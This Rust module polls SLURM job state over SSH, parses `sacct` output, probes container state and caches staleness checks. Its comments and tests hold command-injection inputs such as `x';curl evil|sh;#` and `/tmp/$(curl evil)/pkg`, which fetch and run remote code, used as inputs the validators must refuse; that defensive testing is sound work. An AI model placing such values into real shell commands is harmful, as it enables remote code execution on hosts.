//! Poll `sacct` to drive a SLURM job to terminal state. Parses the
//! parseable `sacct -n -P` format and normalizes SLURM's state strings
//! into an enum so the executor never branches on raw strings. A per-job
//! staleness cache mirrors `aws/ssm.rs::do_is_task_stale` so the
//! harness's `is_task_stale` check doesn't fire an SSH round-trip on
//! every call.

use super::super::_id_validator::package_dir_is_safe;
use super::ssh::SshSession;
use anyhow::{anyhow, Result};
use parking_lot::Mutex;
use scripps_workflow_core::blocker::BlockerKind;
use scripps_workflow_core::container_state::{ContainerProbeOutcome, ContainerState};
use std::collections::BTreeMap;
use std::time::{Duration, Instant};

/// Terminal vs non-terminal SLURM states. `sacct` reports both.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum JobState {
    Pending,
    Running,
    Completing,
    Completed,
    Failed,
    Cancelled,
    Timeout,
    NodeFail,
    OutOfMemory,
    Preempted,
    /// Catch-all for Suspended / Requeued / any state not explicitly
    /// in SLURM's documented terminal set. Treated as non-terminal.
    Other,
}

impl JobState {
    pub fn is_terminal(self) -> bool {
        matches!(
            self,
            JobState::Completed
                | JobState::Failed
                | JobState::Cancelled
                | JobState::Timeout
                | JobState::NodeFail
                | JobState::OutOfMemory
                | JobState::Preempted
        )
    }

    /// Map a terminal state to a typed `BlockerKind` when the state
    /// names a scheduler-induced failure mode the conversation surface
    /// has a dedicated affordance for. Returns `None` for `Completed`,
    /// `Failed`, `Cancelled`, `NodeFail`, `Preempted`, and any
    /// non-terminal state — those go through the generic
    /// `ToolError`-with-envelope path. SLURM 24.11+ failure-mode
    /// taxonomy per plan §S2.12.
    ///
    /// `peak_memory_mb` and `limit_mb` come from the executor's sacct
    /// follow-up query (MaxRSS, ReqMem); `wallclock_secs` and
    /// `time_limit_secs` come from sacct (Elapsed, Timelimit). All four
    /// are optional — the wire format tolerates absent fields and the
    /// recovery hint stays informative even without them.
    pub fn to_blocker_kind(
        self,
        peak_memory_mb: Option<u64>,
        limit_mb: Option<u64>,
        wallclock_secs: Option<u64>,
        time_limit_secs: Option<u64>,
    ) -> Option<BlockerKind> {
        match self {
            JobState::OutOfMemory => Some(BlockerKind::MemoryExhausted {
                peak_memory_mb,
                limit_mb,
            }),
            JobState::Timeout => Some(BlockerKind::TimeExceeded {
                wallclock_secs,
                time_limit_secs,
            }),
            _ => None,
        }
    }

    /// Map a terminal state to the Unix exit code the harness should
    /// report to the agent. Mirrors AWS's SSM exit-code propagation:
    /// success → 0, everything else → non-zero, preserving the
    /// `ExitStatus::from_raw` contract downstream.
    pub fn to_exit_code(self, sacct_exit_code: Option<i32>) -> i32 {
        // SLURM job-state exit code mapping. References:
        // - UNIX signals: SIGINT=2 → exit 130, SIGTERM=15 → exit 143, SIGKILL=9 → exit 137.
        // - GNU `timeout(1)`: exits 124 on time exceeded, 125 on "timeout itself failed".
        // - SLURM convention: NodeFail maps to 125 (failure was not the job's fault).
        // - SLURM convention: Preempted maps to 143 (job was sent SIGTERM by the scheduler).
        // Per Plan S2.12.
        match self {
            JobState::Completed => sacct_exit_code.unwrap_or(0),
            JobState::Failed => sacct_exit_code.unwrap_or(1),
            // The rest are "job didn't run to natural completion" — we
            // synthesize a non-zero exit so the agent sees the failure.
            JobState::Cancelled => 130,   // SIGINT (user cancellation)
            JobState::Timeout => 124,     // GNU timeout convention
            JobState::NodeFail => 125,    // GNU timeout: command failed
            JobState::OutOfMemory => 137, // SIGKILL (OOM killer)
            JobState::Preempted => 143,   // SIGTERM (scheduler-initiated)
            // Non-terminal states should never be passed here; use a
            // sentinel if they are, so the bug surfaces loudly.
            JobState::Pending | JobState::Running | JobState::Completing | JobState::Other => -1,
        }
    }
}

fn parse_state(word: &str) -> JobState {
    // SLURM sometimes prints `CANCELLED by 12345` (user that cancelled).
    // Split on whitespace to get just the state token.
    let head = word.split_whitespace().next().unwrap_or(word);
    match head {
        "PENDING" | "PD" => JobState::Pending,
        "RUNNING" | "R" => JobState::Running,
        "COMPLETING" | "CG" => JobState::Completing,
        "COMPLETED" | "CD" => JobState::Completed,
        "FAILED" | "F" => JobState::Failed,
        "CANCELLED" | "CA" => JobState::Cancelled,
        "TIMEOUT" | "TO" => JobState::Timeout,
        "NODE_FAIL" | "NF" => JobState::NodeFail,
        "OUT_OF_MEMORY" | "OOM" => JobState::OutOfMemory,
        "PREEMPTED" | "PR" => JobState::Preempted,
        _ => JobState::Other,
    }
}

/// Parsed `sacct` row for a job.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SacctRow {
    pub state: JobState,
    /// Integer exit code parsed from SLURM's `ExitCode` field (shape
    /// `<exit>:<signal>`; we only keep `exit`). `None` when absent or
    /// unparseable.
    pub exit_code: Option<i32>,
    pub node_list: String,
    pub partition: String,
}

/// Parse the first line of `sacct -j <jobid> -n -P --format=State,ExitCode,NodeList,Partition`
/// output. SLURM emits one row per step by default; the batch step is
/// typically the first row and carries the overall job state. We keep
/// only the first row to keep the parser simple.
pub fn parse_sacct_row(stdout: &str) -> Option<SacctRow> {
    let line = stdout.lines().next()?.trim();
    if line.is_empty() {
        return None;
    }
    let parts: Vec<&str> = line.split('|').collect();
    parse_sacct_row_from_cols_4(&parts)
}

/// Shared column parser for the 4-field single-job `sacct` format
/// (`State,ExitCode,NodeList,Partition`). Returns None when the row is
/// too short to parse.
fn parse_sacct_row_from_cols_4(parts: &[&str]) -> Option<SacctRow> {
    if parts.len() < 4 {
        return None;
    }
    let state = parse_state(parts[0]);
    let exit_code = parts[1]
        .split(':')
        .next()
        .and_then(|s| s.parse::<i32>().ok());
    Some(SacctRow {
        state,
        exit_code,
        node_list: parts[2].to_string(),
        partition: parts[3].to_string(),
    })
}

/// Column parser for the 5-field batched-query `sacct` format
/// (`JobID,State,ExitCode,NodeList,Partition`). The JobID column is
/// caller-handled (used as the map key); this parser consumes the
/// remaining 4 trailing columns.
fn parse_sacct_row_from_cols_5(parts: &[&str]) -> Option<SacctRow> {
    if parts.len() < 5 {
        return None;
    }
    parse_sacct_row_from_cols_4(&parts[1..])
}

/// Container-aware probe over SSH.
///
/// SLURM has no SSM equivalent for the AWS path, so the probe is one
/// SSH round-trip:
///
/// 1. `apptainer instance list --json` (gracefully no-op when the
/// runtime is docker/podman — we just check stdout for a JSON
/// object whose `instances[]` array contains a name matching the
/// task id).
/// 2. `cat <package>/runtime/outputs/<task_id>/.container-state.json`
/// — present only after the container has exited.
///
/// Both run in one shell invocation that emits the same envelope shape
/// the AWS path uses, so `aws::orphans::classify_probe_envelope` can
/// parse it. The shell short-circuits to empty `live=""` if neither
/// runtime is on PATH (host-mode SLURM, no container at all).
pub fn probe_container_state(
    ssh: &dyn SshSession,
    task_id: &str,
    package_dir: &str,
) -> ContainerProbeOutcome {
    // `task_id` and `package_dir` are
    // interpolated directly into a bash script that runs over SSH.
    // Without validation a hostile task id like `x';curl evil|sh;#`
    // executes on the remote host. Refuse anything outside the
    // POSIX-portable identifier shape (`^[A-Za-z0-9_.-]+$`, length
    // ≤ 128) before composing the script.
    if let Err(reason) = super::super::_id_validator::sanitize_task_id(task_id) {
        return ContainerProbeOutcome::ProbeFailed { reason };
    }
    // For package_dir, allow forward slashes (it's an absolute path
    // on the remote host) but each path segment must satisfy the
    // same id-shape rules. This refuses `; rm -rf /tmp` while still
    // accepting `/scratch/swfc/packages/bulk_rnaseq_20260514T120000`.
    if !package_dir_is_safe(package_dir) {
        return ContainerProbeOutcome::ProbeFailed {
            reason: format!("unsafe package_dir for SSH interpolation: {package_dir:?}"),
        };
    }
    let script = format!(
        "set -u\
         ; LIVE=\"\"\
         ; if command -v apptainer >/dev/null 2>&1; then \
             LIVE=$(apptainer instance list --json 2>/dev/null \
               | grep -o '\"instance\":\"[^\"]*'\"{task_id}\"'[^\"]*\"' \
               | head -1 \
               | sed 's/\"instance\":\"//;s/\"$//'); \
           fi\
         ; if [ -z \"$LIVE\" ] && command -v docker >/dev/null 2>&1; then \
             LIVE=$(docker ps --filter label=swfc-task={task_id} --format '{{{{.ID}}}}' 2>/dev/null | head -1); \
           fi\
         ; SIDECAR=\"\"; SIDECAR_PATH={package_dir}/runtime/outputs/{task_id}/.container-state.json\
         ; if [ -f \"$SIDECAR_PATH\" ]; then SIDECAR=$(cat \"$SIDECAR_PATH\" 2>/dev/null); fi\
         ; printf '{{\"live\":\"%s\",\"sidecar\":%s}}' \"$LIVE\" \"$(if [ -z \"$SIDECAR\" ]; then echo null; else echo \"$SIDECAR\"; fi)\""
    );
    let out = match ssh.run(&script) {
        Ok(o) => o,
        Err(e) => {
            return ContainerProbeOutcome::ProbeFailed {
                reason: format!("ssh: {e}"),
            };
        }
    };
    if !out.is_success() {
        return ContainerProbeOutcome::ProbeFailed {
            reason: format!("ssh exit {}: {}", out.exit_code, out.stderr),
        };
    }
    classify_slurm_probe_envelope(&out.stdout)
}

/// Parser for the SSH probe envelope. Identical to the AWS-side parser
/// in `aws::orphans::classify_probe_envelope`; the SLURM path keeps a
/// local copy so the executor sub-modules stay independent (the SLURM
/// build doesn't link the AWS module). Apptainer-specific fix-up: when
/// the live token comes from `apptainer instance list`, runtime is
/// `apptainer`; otherwise `docker`.
fn classify_slurm_probe_envelope(body: &str) -> ContainerProbeOutcome {
    let trimmed = body.trim();
    if trimmed.is_empty() {
        return ContainerProbeOutcome::NoSignal;
    }
    let v: serde_json::Value = match serde_json::from_str(trimmed) {
        Ok(v) => v,
        Err(e) => {
            return ContainerProbeOutcome::ProbeFailed {
                reason: format!("envelope parse: {e}"),
            };
        }
    };
    let live = v.get("live").and_then(|x| x.as_str()).unwrap_or("");
    if !live.is_empty() {
        // Apptainer instance names embed the task id; docker container
        // ids are 12-hex (or 64-hex). Cheap heuristic: hex-only short
        // string => docker; anything else => apptainer.
        let runtime = if live.len() <= 12 && live.chars().all(|c| c.is_ascii_hexdigit()) {
            "docker"
        } else {
            "apptainer"
        };
        return ContainerProbeOutcome::ContainerAlive {
            container_id: live.to_string(),
            runtime: runtime.to_string(),
        };
    }
    let sidecar = v.get("sidecar");
    match sidecar {
        Some(s) if !s.is_null() => match serde_json::from_value::<ContainerState>(s.clone()) {
            Ok(state) if !state.task_id.is_empty() => {
                ContainerProbeOutcome::ContainerExited { state }
            }
            Ok(_) => ContainerProbeOutcome::ProbeFailed {
                reason: "sidecar missing task_id".into(),
            },
            Err(e) => ContainerProbeOutcome::ProbeFailed {
                reason: format!("sidecar parse: {e}"),
            },
        },
        _ => ContainerProbeOutcome::NoSignal,
    }
}

/// Query `sacct` for one job and return the parsed row. Returns
/// `Ok(None)` when `sacct` emits no rows (the job hasn't hit the
/// accounting DB yet — typical within the first second of submission).
pub fn query_job(ssh: &dyn SshSession, job_id: &str) -> Result<Option<SacctRow>> {
    let cmd = format!("sacct -j {job_id} -n -P --format=State,ExitCode,NodeList,Partition");
    let out = ssh.run(&cmd)?;
    if !out.is_success() {
        return Err(anyhow!(
            "sacct {job_id} failed (exit {}): {}",
            out.exit_code,
            out.stderr
        ));
    }
    Ok(parse_sacct_row(&out.stdout))
}

/// Query `sacct` for multiple jobs in a single SSH round-trip and
/// return their rows keyed by job id. `sacct` accepts comma-separated
/// job ids natively; the format prepends `JobID` so the response can
/// be demultiplexed. Falls back to `None` for jobs whose row is
/// missing (e.g., not yet in the accounting DB).
///
/// SLURM emits one row per job + one row per step (step rows have
/// suffixes like `.batch`, `.extern`); the parser keeps only the
/// bare-id rows. Job ids matching the input that produce no row map
/// to `None` rather than being absent from the result map.
pub fn query_jobs_batched(
    ssh: &dyn SshSession,
    job_ids: &[String],
) -> Result<BTreeMap<String, Option<SacctRow>>> {
    if job_ids.is_empty() {
        return Ok(BTreeMap::new());
    }
    let joined = job_ids.join(",");
    let cmd = format!("sacct -j {joined} -n -P --format=JobID,State,ExitCode,NodeList,Partition");
    let out = ssh.run(&cmd)?;
    if !out.is_success() {
        return Err(anyhow!(
            "sacct batched ({} jobs) failed (exit {}): {}",
            job_ids.len(),
            out.exit_code,
            out.stderr
        ));
    }
    let mut out_map: BTreeMap<String, Option<SacctRow>> = BTreeMap::new();
    for id in job_ids {
        out_map.insert(id.clone(), None);
    }
    for line in out.stdout.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let cols: Vec<&str> = trimmed.split('|').collect();
        if cols.is_empty() {
            continue;
        }
        let job_id_field = cols[0];
        // Skip step rows (.batch, .extern, etc.) — the bare job-id row
        // carries the overall state we want for the map key.
        if job_id_field.contains('.') {
            continue;
        }
        if let Some(row) = parse_sacct_row_from_cols_5(&cols) {
            out_map.insert(job_id_field.to_string(), Some(row));
        }
    }
    Ok(out_map)
}

/// Per-job staleness cache. Mirrors `aws/ssm.rs::do_is_task_stale`:
/// the harness calls `is_task_stale` on every loop tick, and we don't
/// want each call to issue a fresh SSH round-trip. Entries older than
/// `ttl` are re-queried.
pub struct StaleCache {
    ttl: Duration,
    entries: Mutex<BTreeMap<String, (Instant, bool)>>,
}

impl StaleCache {
    pub fn new(ttl: Duration) -> Self {
        Self {
            ttl,
            entries: Mutex::new(BTreeMap::new()),
        }
    }

    /// Default 30-second TTL — matches the plan's recommended
    /// `SWFC_SLURM_POLL_INTERVAL_SECS` upper bound so a stale-check
    /// burst within one poll window costs one SSH round-trip.
    pub fn with_default_ttl() -> Self {
        Self::new(Duration::from_secs(30))
    }

    /// Return the cached staleness result for `job_id` if still fresh,
    /// else None (caller must compute + then `insert`).
    pub fn get(&self, job_id: &str, now: Instant) -> Option<bool> {
        let entries = self.entries.lock();
        let (cached_at, stale) = entries.get(job_id)?;
        if now.duration_since(*cached_at) < self.ttl {
            Some(*stale)
        } else {
            None
        }
    }

    pub fn insert(&self, job_id: &str, stale: bool, now: Instant) {
        let mut entries = self.entries.lock();
        entries.insert(job_id.to_string(), (now, stale));
    }

    pub fn invalidate(&self, job_id: &str) {
        let mut entries = self.entries.lock();
        entries.remove(job_id);
    }

    #[cfg(test)]
    pub(crate) fn len(&self) -> usize {
        self.entries.lock().len()
    }
}

#[cfg(test)]
mod tests {
    use super::super::ssh::{FakeSshSession, SshOutcome};
    use super::*;

    #[test]
    fn is_terminal_matches_documented_slurm_set() {
        use JobState::*;
        for s in [
            Completed,
            Failed,
            Cancelled,
            Timeout,
            NodeFail,
            OutOfMemory,
            Preempted,
        ] {
            assert!(s.is_terminal(), "{s:?} must be terminal");
        }
        for s in [Pending, Running, Completing, Other] {
            assert!(!s.is_terminal(), "{s:?} must NOT be terminal");
        }
    }

    #[test]
    fn exit_code_completed_uses_sacct_value_or_zero() {
        assert_eq!(JobState::Completed.to_exit_code(Some(0)), 0);
        assert_eq!(JobState::Completed.to_exit_code(Some(5)), 5);
        assert_eq!(JobState::Completed.to_exit_code(None), 0);
    }

    #[test]
    fn exit_code_failed_uses_sacct_or_one() {
        assert_eq!(JobState::Failed.to_exit_code(Some(2)), 2);
        assert_eq!(JobState::Failed.to_exit_code(None), 1);
    }

    #[test]
    fn exit_code_oom_preempted_timeout_cancelled_map_to_stable_codes() {
        // These codes are a harness-stable convention: downstream
        // progress-event consumers may key on them. Lock them in so
        // nobody accidentally drifts the mapping.
        assert_eq!(JobState::OutOfMemory.to_exit_code(None), 137);
        assert_eq!(JobState::Preempted.to_exit_code(None), 143);
        assert_eq!(JobState::Timeout.to_exit_code(None), 124);
        assert_eq!(JobState::Cancelled.to_exit_code(None), 130);
        assert_eq!(JobState::NodeFail.to_exit_code(None), 125);
    }

    #[test]
    fn exit_code_nonterminal_returns_sentinel() {
        // Passing a non-terminal state through to_exit_code is a bug
        // upstream; the -1 sentinel makes it loud.
        assert_eq!(JobState::Running.to_exit_code(Some(0)), -1);
        assert_eq!(JobState::Pending.to_exit_code(None), -1);
    }

    #[test]
    fn parse_state_handles_long_and_short_forms() {
        assert_eq!(parse_state("COMPLETED"), JobState::Completed);
        assert_eq!(parse_state("CD"), JobState::Completed);
        assert_eq!(parse_state("FAILED"), JobState::Failed);
        assert_eq!(parse_state("RUNNING"), JobState::Running);
        assert_eq!(parse_state("R"), JobState::Running);
        assert_eq!(parse_state("OUT_OF_MEMORY"), JobState::OutOfMemory);
        assert_eq!(parse_state("OOM"), JobState::OutOfMemory);
        assert_eq!(parse_state("TIMEOUT"), JobState::Timeout);
    }

    #[test]
    fn parse_state_strips_cancelled_by_user_suffix() {
        // SLURM writes `CANCELLED by 12345` when a user cancels.
        assert_eq!(parse_state("CANCELLED by 12345"), JobState::Cancelled);
    }

    #[test]
    fn parse_state_unknown_word_is_other() {
        assert_eq!(parse_state("SUSPENDED"), JobState::Other);
        assert_eq!(parse_state("REQUEUED"), JobState::Other);
    }

    #[test]
    fn parse_sacct_row_handles_success_row() {
        let stdout = "COMPLETED|0:0|node-07|normal\n";
        let row = parse_sacct_row(stdout).expect("must parse");
        assert_eq!(row.state, JobState::Completed);
        assert_eq!(row.exit_code, Some(0));
        assert_eq!(row.node_list, "node-07");
        assert_eq!(row.partition, "normal");
    }

    #[test]
    fn parse_sacct_row_handles_failed_row_with_signal() {
        // SLURM's ExitCode field is `<exit>:<signal>`. We take exit.
        let stdout = "FAILED|1:9|node-12|long\n";
        let row = parse_sacct_row(stdout).unwrap();
        assert_eq!(row.state, JobState::Failed);
        assert_eq!(row.exit_code, Some(1));
    }

    #[test]
    fn parse_sacct_row_handles_oom_row() {
        let stdout = "OUT_OF_MEMORY|0:9|gpu-03|gpu\n";
        let row = parse_sacct_row(stdout).unwrap();
        assert_eq!(row.state, JobState::OutOfMemory);
    }

    #[test]
    fn parse_sacct_row_handles_cancelled_row_with_by_user_suffix() {
        let stdout = "CANCELLED by 501|0:15|node-01|short\n";
        let row = parse_sacct_row(stdout).unwrap();
        assert_eq!(row.state, JobState::Cancelled);
    }

    #[test]
    fn parse_sacct_row_rejects_short_rows() {
        assert!(parse_sacct_row("").is_none());
        assert!(parse_sacct_row("COMPLETED|0:0").is_none()); // only 2 fields
    }

    #[test]
    fn parse_sacct_row_takes_first_line_only() {
        // sacct emits multiple rows (one per step); we only care about the
        // first which is the batch step carrying overall state.
        let stdout = "RUNNING|0:0|node-01|normal\nCOMPLETED|0:0|node-01|normal\n";
        let row = parse_sacct_row(stdout).unwrap();
        assert_eq!(row.state, JobState::Running);
    }

    #[test]
    fn parse_sacct_row_handles_missing_exit_code() {
        let stdout = "PENDING||(None)|normal\n";
        let row = parse_sacct_row(stdout).unwrap();
        assert_eq!(row.state, JobState::Pending);
        assert_eq!(row.exit_code, None);
    }

    #[test]
    fn query_job_returns_parsed_row_on_success() {
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "sacct -j 12345 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::success("COMPLETED|0:0|node-07|normal\n"),
        );
        let row = query_job(&fake, "12345").unwrap().unwrap();
        assert_eq!(row.state, JobState::Completed);
        assert_eq!(row.partition, "normal");
    }

    #[test]
    fn query_job_returns_none_on_empty_stdout() {
        // A just-submitted job may not be in the accounting DB yet —
        // sacct returns empty stdout, not an error.
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "sacct -j 99999 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::success(""),
        );
        assert!(query_job(&fake, "99999").unwrap().is_none());
    }

    #[test]
    fn query_job_propagates_ssh_failure() {
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "sacct -j 1 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::failure("slurm_load_jobs error: Invalid job id specified", 1),
        );
        let err = query_job(&fake, "1").unwrap_err();
        assert!(err.to_string().contains("sacct 1 failed"));
    }

    #[test]
    fn stale_cache_returns_cached_result_within_ttl() {
        let cache = StaleCache::new(Duration::from_secs(60));
        let t0 = Instant::now();
        cache.insert("123", true, t0);
        assert_eq!(cache.get("123", t0 + Duration::from_secs(10)), Some(true));
        assert_eq!(cache.get("123", t0 + Duration::from_secs(59)), Some(true));
    }

    #[test]
    fn stale_cache_expires_past_ttl() {
        let cache = StaleCache::new(Duration::from_secs(30));
        let t0 = Instant::now();
        cache.insert("123", false, t0);
        assert_eq!(cache.get("123", t0 + Duration::from_secs(31)), None);
    }

    #[test]
    fn stale_cache_miss_for_unknown_job() {
        let cache = StaleCache::with_default_ttl();
        assert_eq!(cache.get("nonexistent", Instant::now()), None);
    }

    #[test]
    fn stale_cache_invalidate_removes_entry() {
        let cache = StaleCache::new(Duration::from_secs(60));
        let t0 = Instant::now();
        cache.insert("12", false, t0);
        assert_eq!(cache.len(), 1);
        cache.invalidate("12");
        assert_eq!(cache.len(), 0);
        assert_eq!(cache.get("12", t0), None);
    }

    #[test]
    fn to_blocker_kind_promotes_oom_to_memory_exhausted() {
        let kind = JobState::OutOfMemory
            .to_blocker_kind(Some(61_440), Some(32_768), None, None)
            .expect("oom must map to typed kind");
        match kind {
            BlockerKind::MemoryExhausted {
                peak_memory_mb,
                limit_mb,
            } => {
                assert_eq!(peak_memory_mb, Some(61_440));
                assert_eq!(limit_mb, Some(32_768));
            }
            other => panic!("expected MemoryExhausted, got {other:?}"),
        }
    }

    #[test]
    fn to_blocker_kind_promotes_timeout_to_time_exceeded() {
        let kind = JobState::Timeout
            .to_blocker_kind(None, None, Some(14_400), Some(14_400))
            .expect("timeout must map to typed kind");
        assert!(matches!(
            kind,
            BlockerKind::TimeExceeded {
                wallclock_secs: Some(14_400),
                time_limit_secs: Some(14_400),
            }
        ));
    }

    #[test]
    fn to_blocker_kind_returns_none_for_generic_failures() {
        // FAILED / CANCELLED / NODE_FAIL / PREEMPTED go through the
        // generic ToolError-with-envelope path — there's no dedicated
        // BlockerKind variant for them, so to_blocker_kind returns None
        // and the harness falls back to envelope wrapping.
        for state in [
            JobState::Failed,
            JobState::Cancelled,
            JobState::NodeFail,
            JobState::Preempted,
            JobState::Completed,
            JobState::Running,
        ] {
            assert!(
                state.to_blocker_kind(None, None, None, None).is_none(),
                "expected None for {state:?}"
            );
        }
    }

    #[test]
    fn terminal_state_transitions_cover_every_failure_mode() {
        // Lock the state-machine contract: the six failure modes called
        // out in the plan §4.4 (COMPLETED / FAILED / TIMEOUT /
        // CANCELLED / OOM / PREEMPTED) plus NODE_FAIL must all parse +
        // classify as terminal + emit a stable non-zero exit code (or
        // zero for Completed).
        let fixtures = [
            ("COMPLETED|0:0|n|p\n", JobState::Completed, 0),
            ("FAILED|1:0|n|p\n", JobState::Failed, 1),
            ("TIMEOUT|0:0|n|p\n", JobState::Timeout, 124),
            ("CANCELLED by 1|0:15|n|p\n", JobState::Cancelled, 130),
            ("OUT_OF_MEMORY|0:9|n|p\n", JobState::OutOfMemory, 137),
            ("PREEMPTED|0:15|n|p\n", JobState::Preempted, 143),
            ("NODE_FAIL|0:0|n|p\n", JobState::NodeFail, 125),
        ];
        for (stdout, expected_state, expected_exit) in fixtures {
            let row = parse_sacct_row(stdout).expect(stdout);
            assert_eq!(row.state, expected_state, "state mismatch for {stdout}");
            assert!(row.state.is_terminal(), "not terminal: {stdout}");
            assert_eq!(
                row.state.to_exit_code(row.exit_code),
                expected_exit,
                "exit code drift for {stdout}"
            );
        }
    }

    #[test]
    fn classify_slurm_envelope_handles_apptainer_vs_docker_runtime_attribution() {
        // Apptainer instance names are arbitrary strings (often the task
        // id with a prefix); docker container ids are 12-hex.
        let apptainer =
            classify_slurm_probe_envelope(r#"{"live":"swfc-task-qc-12345","sidecar":null}"#);
        match apptainer {
            ContainerProbeOutcome::ContainerAlive { runtime, .. } => {
                assert_eq!(runtime, "apptainer");
            }
            other => panic!("expected ContainerAlive(apptainer), got {other:?}"),
        }
        let docker = classify_slurm_probe_envelope(r#"{"live":"abc123def","sidecar":null}"#);
        match docker {
            ContainerProbeOutcome::ContainerAlive { runtime, .. } => {
                assert_eq!(runtime, "docker");
            }
            other => panic!("expected ContainerAlive(docker), got {other:?}"),
        }
    }

    #[test]
    fn slurm_probe_returns_alive_when_ssh_reports_live_container() {
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "set -u",
            SshOutcome::success(r#"{"live":"swfc-qc","sidecar":null}"#),
        );
        let outcome = probe_container_state(&fake, "qc", "/tmp/pkg");
        match outcome {
            ContainerProbeOutcome::ContainerAlive {
                container_id,
                runtime,
            } => {
                assert_eq!(container_id, "swfc-qc");
                assert_eq!(runtime, "apptainer");
            }
            other => panic!("expected ContainerAlive, got {other:?}"),
        }
    }

    #[test]
    fn slurm_probe_returns_exited_when_ssh_reports_only_sidecar() {
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "set -u",
            SshOutcome::success(
                r#"{"live":"","sidecar":{"task_id":"alignment","exit_code":137,"runtime":"apptainer"}}"#,
            ),
        );
        let outcome = probe_container_state(&fake, "alignment", "/tmp/pkg");
        match outcome {
            ContainerProbeOutcome::ContainerExited { state } => {
                assert_eq!(state.task_id, "alignment");
                assert_eq!(state.exit_code, 137);
            }
            other => panic!("expected ContainerExited, got {other:?}"),
        }
    }

    #[test]
    fn slurm_probe_returns_no_signal_when_neither_alive_nor_sidecar() {
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "set -u",
            SshOutcome::success(r#"{"live":"","sidecar":null}"#),
        );
        let outcome = probe_container_state(&fake, "qc", "/tmp/pkg");
        assert_eq!(outcome, ContainerProbeOutcome::NoSignal);
    }

    #[test]
    fn slurm_probe_propagates_ssh_failure_as_probe_failed() {
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "set -u",
            SshOutcome::failure("ssh: Connection refused", 255),
        );
        let outcome = probe_container_state(&fake, "qc", "/tmp/pkg");
        match outcome {
            ContainerProbeOutcome::ProbeFailed { reason } => {
                assert!(reason.contains("ssh exit"));
            }
            other => panic!("expected ProbeFailed, got {other:?}"),
        }
    }

    // ── SSH-interpolation validators ──────────────────────────

    #[test]
    fn probe_refuses_unsafe_task_id() {
        // The hostile task id would otherwise be interpolated literally
        // into the bash script run on the SLURM login node. Without the
        // validator the embedded `;curl evil|sh` is a live RCE.
        let fake = FakeSshSession::new("cluster");
        let outcome = probe_container_state(&fake, "x';curl evil|sh;#", "/tmp/pkg");
        match outcome {
            ContainerProbeOutcome::ProbeFailed { reason } => {
                assert!(
                    reason.contains("unsafe task id"),
                    "expected refusal, got {reason:?}"
                );
            }
            other => panic!("expected ProbeFailed for unsafe task id, got {other:?}"),
        }
        // The fake should NOT have been driven — refuse happens BEFORE
        // composing the script.
        assert!(
            fake.calls().is_empty(),
            "validator must refuse before invoking ssh; got calls {:?}",
            fake.calls()
        );
    }

    #[test]
    fn probe_refuses_unsafe_package_dir() {
        let fake = FakeSshSession::new("cluster");
        let outcome = probe_container_state(&fake, "qc", "/tmp/$(curl evil)/pkg");
        match outcome {
            ContainerProbeOutcome::ProbeFailed { reason } => {
                assert!(
                    reason.contains("unsafe package_dir"),
                    "expected refusal, got {reason:?}"
                );
            }
            other => panic!("expected ProbeFailed for unsafe package_dir, got {other:?}"),
        }
        assert!(fake.calls().is_empty());
    }

    #[test]
    fn probe_refuses_leading_dash_package_dir() {
        // `-rf` would be re-interpreted as a flag by downstream cat.
        let fake = FakeSshSession::new("cluster");
        let outcome = probe_container_state(&fake, "qc", "-rf");
        match outcome {
            ContainerProbeOutcome::ProbeFailed { reason } => {
                assert!(reason.contains("unsafe package_dir"));
            }
            other => panic!("expected ProbeFailed, got {other:?}"),
        }
    }

    #[test]
    fn probe_accepts_canonical_paths() {
        // Sanity: real task ids and package paths pass the validators.
        // We only check the validator gate; SSH dispatch is exercised by
        // the existing probe tests above.
        assert!(package_dir_is_safe(
            "/scratch/swfc/packages/bulk_rnaseq_20260514"
        ));
        assert!(package_dir_is_safe("/tmp/pkg"));
        assert!(package_dir_is_safe("relative/pkg"));
        assert!(!package_dir_is_safe(""));
        assert!(!package_dir_is_safe("/tmp//double"));
        assert!(!package_dir_is_safe("/tmp/$(id)"));
        assert!(!package_dir_is_safe("/tmp/x;rm"));
    }
}
